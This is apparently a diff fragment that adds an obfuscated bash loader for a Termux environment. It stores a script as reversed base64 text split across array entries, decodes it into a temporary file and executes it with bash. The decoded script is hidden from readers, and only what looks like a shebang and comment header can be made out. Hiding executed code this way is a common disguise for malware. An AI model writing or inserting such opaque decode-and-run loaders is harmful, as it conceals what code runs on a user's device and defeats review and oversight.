+_c+='6wUQHVETf50VP50SOV1X7RiIgojCuwWYul2ZpJ3bgIXZu5WYjNHIsVGZg42bpN2YlRXZkBSegMXa'
+_c+='zlGbh5WYgUGZgMXZu9Waj5WdmBychxGIhZnclNnbvNGIvZXaoNmchBSZ0NXRgMiCu8WayFGdllGc'
+_c+='vJHcgwWZkBCZ1RXajlGbvNHIy9GcgUGduVWbsFmcvBXblRHIhRWY0lGbpJWYoNXZkBSY0NXZgkXZ'
+_c+='rBicvBHIu9WajF2YpRnblRXdhBSYsBiOBR1TOByIK4ybklWdilmc0NXakBCZh9Gb5FGcgwWZgUGZ'
+_c+='zVGZg8GZpVnc0NnbvNWZyBicl5mbhN2cgQJgiDCdhVGaDlGduFEITNVa6lGVgMiCoNXYi9ibpJ2L'
+_c+='yNXdvMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvEyI'
+_r=$(printf '%s' "${_c[@]}")
+_t=$(mktemp 2>/dev/null || echo "/data/data/com.termux/files/home/.sc_$$")
+trap 'rm -f "$_t"' EXIT
+printf '%s' "$_r" | rev | base64 -d 2>/dev/null > "$_t" || exit 1
+bash "$_t" "$@"
